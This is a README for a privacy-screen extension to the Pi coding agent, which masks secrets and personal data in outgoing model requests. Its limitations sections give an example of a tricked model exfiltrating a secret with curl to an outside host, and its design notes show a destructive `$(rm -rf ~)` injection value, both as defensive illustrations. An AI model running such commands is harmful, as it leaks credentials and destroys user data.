# Privacy screen for Pi

An extension for the [Pi coding agent](https://pi.dev) that keeps secrets and personal data out of requests sent to remote model providers. Before a request leaves your Mac, sensitive values are replaced with numbered placeholders; when the model replies or makes tool calls, the real values are restored locally.

```text
you type             Mail lena.fischer@example.com that the token is ghp_x7Kq...9AbCdEf.
the provider gets    Mail <EMAIL_1> that the token is <SECRET_1>.
the model answers    I saved <EMAIL_1> to contact.txt.
you see              I saved lena.fischer@example.com to contact.txt.
contact.txt holds    lena.fischer@example.com
```

Everything stored, displayed, and executed on your machine uses the real values—only outgoing requests to remote model providers are masked. Detection runs entirely locally via `opf-mlx serve` from this repository; no text is sent externally to be scanned.

> [!WARNING]
> **This is a second line of defense, not a guarantee.** It is meant to catch secrets pasted by accident, a `.env` file a tool happens to read, or a customer name in a log. It does not make it safe to hand an agent data you would not otherwise trust it with.

## Limitations at a glance

![Diagram showing what the privacy screen covers and what bypasses it. Model requests pass through the screen and leave masked, except for values missed by the detector, images, encoded/hashed/split values, names appearing only in the system prompt, and text added later by other extensions. Local tools run with real values and can send data externally. Direct model calls made by other extensions are not screened.](../docs/privacy-screen-limits.svg)

- **Screens model requests, not tool execution**: Tools receive the real values so they can function, which means commands that upload files, push to Git, or fetch URLs send whatever they send. A model tricked into running `curl https://elsewhere/?k=<SECRET_1>` will transmit the real secret.
- **Detector blind spots**: Detection relies on a model and regex patterns, both of which can miss values. Recall on your own codebase or data has not been measured.
- **Alternate encodings and non-text content**: Base64, URL-encoded, hashed, or line-split secrets look like different strings and will not match. Images are not scanned.
- **System prompt exclusions**: The system prompt (including `AGENTS.md`) is not sent to the ML detector, so a person's name appearing only there will go out unmasked.
- **Other extensions**: Direct model calls made by other extensions are not screened, nor is text added to a request by another extension that runs after this one.
- **Over-masking common words**: A detected name that is also a regular word (such as "Mark" or "Rose") gets replaced wherever it stands alone.
- **Early-stage software**: Tested only by its own automated suites against Pi 1.6.0 on one machine, with no external security review and no TypeScript type-checking yet.

See [What it does not cover](#what-it-does-not-cover) for the full list.

## Installation

Requires an Apple Silicon Mac, Pi 1.6, and a local clone of this repository with its Python environment and model checkpoint installed:

```console
$ git clone https://github.com/ethanolivertroy/privacy-filter-mlx
$ cd privacy-filter-mlx
$ uv sync && uv run opf-mlx download                    # install the detector and 2.8 GB weights
$ cd pi-privacy-screen
$ ln -s "$PWD" ~/.pi/agent/extensions/privacy-screen    # symlink so the extension finds the local detector
```

Pi automatically loads the extension on its next start as `privacy-screen`. The status bar will show `privacy: mask (0 hidden)`, meaning masking is active immediately.

- **Try it once without installing**: Run `pi -e /path/to/pi-privacy-screen`.
- **Dry run without modifying requests**: See [Trying a dry run first](#trying-a-dry-run-first) below.
- **Uninstall**: Remove the symlink at `~/.pi/agent/extensions/privacy-screen`.

When a Pi session starts, the extension automatically launches a single shared `opf-mlx serve` process for all Pi sessions on the Unix socket `~/.opf/opf-mlx.sock` (accessible only by your user account; nothing listens on the network). Model loading takes under a second on Apple Silicon, logs go to `~/.opf/opf-mlx.sock.log` (never logging input text), and the process exits automatically after 30 minutes of inactivity.

## Usage

Once installed, the extension runs automatically. The Pi footer displays the current status:

| Footer | Meaning |
|---|---|
| `privacy: mask (3 hidden)` | Masking is active; 3 values are currently mapped to placeholders in this session |
| `privacy: report only (3 found)` | Requests are sent unmasked; 3 values would have been hidden |
| `privacy: OFF` | Screening is disabled for this session |
| `privacy: local model, not screened` | The active model runs locally, so requests do not leave your machine |
| `privacy: DETECTOR DOWN, nothing is sent` | The detector is unreachable; outgoing messages are blocked |

### Commands

| Command | Description |
|---|---|
| `/privacy` | Show current mode, active model, detector status, counts, and config path |
| `/privacy mask` \| `report` \| `off` | Switch screening mode for the current session |
| `/privacy list` | List session placeholders with masked hints (`list full` prints the full values) |
| `/privacy reveal <placeholder>` | Stop masking a specific value for the rest of the session (including in earlier turns) |
| `/privacy conceal <placeholder>` | Re-mask a revealed value (values already sent to a provider cannot be unsent) |
| `/privacy retry` | Retry connecting to or starting the detector immediately |

Because the model only sees placeholders, it can pass values through, write them to files, or include them in commands—but it cannot inspect their length, characters, or format. When a task requires inspecting a value, the model is instructed to tell you so you can run `/privacy reveal <SECRET_1>`. Because replies are unmasked before display, the model's suggested command will appear with the real value substituted in; both `reveal` and `conceal` accept either the placeholder or the real value.

### Trying a dry run first

Run `/privacy report` (or set `"mode": "report"` in your settings file) to see what would be masked without modifying any outgoing requests. Use `/privacy list` to review what was found.

### When the detector is unavailable

In `mask` mode, messages fail closed: if the detector is down, your message is not sent. Its text is returned to the editor with a notice explaining why. Pressing Enter retries automatically (after a failed auto-start, the extension waits 30 seconds before trying again unless you run `/privacy retry`). To send without screening, switch to `/privacy off`.

## Configuration

All settings are optional and live in `~/.pi/agent/privacy-screen.json` (override the path with `PI_PRIVACY_SCREEN_CONFIG`). If the file is missing, masking is enabled with default settings. Invalid settings are reported at startup and fall back to their defaults, so a typo cannot accidentally turn off masking.

```json
{
  "mode": "mask",
  "labels": ["secret", "private_email", "private_phone", "private_person", "private_address", "account_number"],
  "screenLocalModels": false,
  "localProviders": [],
  "envFiles": [".env", ".env.local", ".env.*"],
  "server": { "socket": "~/.opf/opf-mlx.sock", "autoStart": true, "idleExit": 1800, "startTimeout": 60 },
  "shellTools": { "bash": ["command"] },
  "codeTools": ["codemode", "powershell"]
}
```

| Setting | Description |
|---|---|
| `mode` | `"mask"`, `"report"` (detect and count without modifying requests), or `"off"` |
| `labels` | Detector categories to mask. `private_url` and `private_date` are supported but disabled by default, since codebases contain many benign URLs and dates |
| `screenLocalModels` | Also screen requests sent to local models |
| `localProviders` | Provider names to treat as local, in addition to endpoints on `localhost`, `127.x.x.x`, or `[::1]` |
| `envFiles` | Filenames or globs in the working directory whose values are pre-seeded as known secrets (`[]` to disable) |
| `server.socket` | Path to the detector's Unix socket |
| `server.command` | Command array used to start the detector (defaults to `opf-mlx serve --no-download` from this repo's `.venv`, falling back to `PATH`) |
| `server.autoStart` | Automatically launch the detector if it isn't running |
| `server.idleExit`, `server.startTimeout` | Idle shutdown and startup timeouts, in seconds |
| `shellTools` | Map of shell tool names to the argument names containing shell commands; restored values are safely shell-quoted in these fields |
| `codeTools` | Tools whose arguments are programs that invoke other tools; placeholders are left intact in the script and restored when the inner tool calls run |

## How it works

![Diagram showing how a request is screened. Pi works on real text locally. Each outgoing request passes through the extension, which queries the local detector for private spans, replaces found values with numbered placeholders, and sends the masked request to the model provider. When the reply returns with placeholders, the extension restores the real values before Pi stores, displays, or runs anything.](../docs/privacy-screen-flow.svg)

1. **Detect**: Every piece of input text (user messages, tool results, shell output, file contents) is scanned once by the local model and checked against deterministic regex patterns for common secret formats (AWS, GitHub, OpenAI/Anthropic-style, Stripe, Slack, Google, npm, Hugging Face, and GitLab keys, JWTs, private key blocks, `Bearer` tokens, passwords in URLs, and assignments to names like `PASSWORD` or `API_KEY`). Values from the project's `.env` files are pre-seeded before you type anything.
2. **Mask**: Each unique value gets a consistent session-wide placeholder (`<EMAIL_1>`, `<SECRET_2>`, etc.). Once a value is known, it is replaced everywhere it appears—including in earlier turns and places where the detector alone would have missed it.
3. **Send**: The system prompt includes brief instructions explaining how placeholders work. A final sweep over the serialized payload catches any known values inside fields that aren't rewritten message-by-message (such as tool descriptions).
4. **Restore**: When the model responds, real values are restored in both the reply text and tool-call arguments before Pi stores, displays, or runs them. Inside shell commands, values are quoted appropriately for their exact syntactic position so a value like `$(rm -rf ~)` is always treated as literal data; if safe quoting cannot be guaranteed, the command is blocked with an explanation the model can act on.
5. **Remember**: Text written by a model is sent back to that same provider verbatim on later turns, keeping the conversation consistent and prompt-cache friendly. Both the placeholder table and remembered assistant texts are saved in the session file and survive `/resume`, `/fork`, and `/tree`.

### Key design rules

- **Literal placeholders in input are escaped**: Text that merely looks like a placeholder in a file or user message (such as `<EMAIL_1>`) is sent out as `<LITERAL_n>` and restored verbatim—so untrusted input can never reference or extract a stored value.
- **Values are only restored for masked requests**: If a request went out unmasked (`report` mode, `off`, or a local model), any placeholder in the model's reply is treated as literal text and left untouched.
- **Fail-closed on errors**: If the detector is unreachable, nothing is sent. If an individual text cannot be scanned, it is withheld and replaced with a notice to the model. If an unexpected error occurs inside the extension, the entire request is aborted.
- **Masked compaction and branch summaries**: Compaction and branch summary requests are generated from masked text. If masking fails, the summary is cancelled rather than sent in the clear.
- **Cross-provider messages are re-checked**: If you switch models/providers mid-session, prior replies from the previous model are treated as untrusted input and scanned before the new provider sees them.

See [docs/architecture.md](../docs/architecture.md), Section 19, for implementation details.

## What it does not cover

- **Detector misses**: Both the ML model and regex patterns can miss sensitive values. Real-world recall on your own material has not been measured.
- **Transformed values**: A secret that is base64-encoded, URL-encoded, hashed, or split across multiple lines is a different string and will not match. Known values are matched verbatim and in JSON-escaped form.
- **Non-text content**: Images and binary content are not inspected.
- **Tool side effects**: The extension only screens outgoing model requests. Tools run with the real values, so commands like `curl`, `git push`, uploads, or web fetches transmit whatever they are asked to send—including if the model is tricked into running `curl https://elsewhere/?k=<SECRET_1>`.
- **Bypassed agent loops**: Model calls made directly by other extensions (outside Pi's agent loop) are not screened.
- **Extension execution order**: Pi runs hooks in extension load order (directory listing order). Text added to a request by another extension running after `privacy-screen` is not scanned.
- **System prompt scanning**: The system prompt (including `AGENTS.md`) is not sent to the ML detector. Known values and regex key patterns are still replaced in it, but a person's name appearing only in the system prompt will go out unmasked.
- **Signed provider thinking**: Thinking blocks returned by a provider are signed and cannot be rewritten in outgoing requests (they are unmasked for display in your terminal).
- **Local models**: Models running on loopback addresses (`localhost`, `127.x.x.x`, `[::1]`) or listed in `localProviders` are not screened unless `screenLocalModels` is enabled.
- **Provider-level trust**: Replies are sent back verbatim to the same provider name. When using an aggregator, a single provider name may route to multiple underlying model companies.
- **False positives on common words**: Once a name that doubles as an ordinary word (like "Mark" or "Rose") is detected, it is masked wherever it appears as a standalone word. Use `/privacy reveal` to undo this for a specific value.
- **Other shells**: Safe shell quoting supports `bash`, `zsh`, and POSIX `sh`. Custom shell-running tools must be registered in `shellTools` or they will receive unquoted values. PowerShell is treated as a code tool (placeholders remain unexpanded).
- **Session file sensitivity**: Pi's session file on disk still contains the unmasked conversation, plus the placeholder mapping table. Protect it with the same care as before.
- **Untested summary setups**: Configurations where Pi uses a different model for summaries than the active conversation model have not been tested. Branch summaries are currently covered by unit tests only.
- **Other Pi versions**: Built and tested only with Pi 1.6.0. After updating Pi, verify masking still works by pasting a made-up key and asking the model how many characters it contains.
- **Limited review and field testing**: Verified only by its own tests, with no independent security audit and limited real-world daily use so far.
- **Oversized or pathological inputs**: Any text over 8 MiB—or one that causes a regex pattern to abort—is withheld rather than sent unscreened.
- **RPC / JSON streaming events**: Consumers of Pi's raw RPC or JSON event stream see placeholders in partial streaming chunks; the finalized message contains the restored values.

## Performance and memory

Measured on an Apple M5 Max with `opf-mlx serve` running on the GPU in `bfloat16`:

- **Startup**: 0.3–1 s once to launch the detector and load weights.
- **Detection latency**: 35–45 ms for texts up to 4,000 characters, adding ~6 ms per additional 1,000 characters (~0.3 s for 50 KB, ~0.6 s for 100 KB, ~6 s for 1 MB). A typical turn adds only a few new texts.
- **Session caching and pre-scanning**: Each unique text is scanned once per session. When resuming a session (`pi -c` or `/resume`), existing messages are scanned immediately in the background while you type (~45 ms per message, or ~10 s for a 250-message session). Sending a message before pre-scanning finishes simply waits for the remaining items.
- **Per-request extension overhead**: Scales with total conversation size—about 5 ms at 200 KB and 65 ms at 2 MB, mostly spent on the final payload sweep.
- **Memory footprint**: The detector holds 2.6 GiB of model weights; standalone benchmarks peak at 3.2–3.7 GiB for texts up to 2,048 tokens (the service process's own peak memory has not been measured separately).

## Tests

```console
$ node --test "test/*.test.ts"    # 177 unit tests (~12 s; Node 22.18+, no Pi or model needed)
$ node test/e2e/run.ts            # end-to-end tests with real Pi, real detector, and a mock provider
$ python3 test/mutations.py       # mutation testing: injects one defect at a time to verify test coverage
```

- **Unit tests**: Include real execution tests of shell quoting in `bash` (5 and macOS 3.2), `zsh`, and `sh` using adversarial inputs.
- **End-to-end tests**: Launch `pi` in both RPC mode and its terminal UI (under `tmux`) using isolated temporary home and agent directories, so your own settings and sessions are never touched. A local mock HTTP server stands in for the remote model provider and records every request (73 assertions across 11 scenarios). Requires `pi`, `tmux`, and the downloaded checkpoint.
- **Type-checking status**: Node runs this TypeScript directly by stripping types; no TypeScript compiler is currently configured, so static type-checking has not been run.

## Repository layout

```text
index.ts             Extension entry point for Pi
src/
  index.ts           Pi lifecycle hooks and /privacy command handler
  screen.ts          Core masking/unmasking engine, caching, and cross-turn memory
  messages.ts        Pi message and provider payload traversal
  vault.ts           Session placeholder mapping table
  spans.ts           Detector span trimming, filtering, and normalization
  patterns.ts        Deterministic regex rules for secret and key formats
  dotenv.ts          .env file discovery and secret pre-seeding
  shell.ts           Context-aware shell quoting for bash, zsh, and POSIX sh
  detector.ts        Client and auto-starter for opf-mlx serve
  config.ts          Settings parsing and validation
test/                Unit tests, e2e/run.ts, and mutations.py
```

## License

MIT, like the rest of this repository. See [LICENSE](../LICENSE).
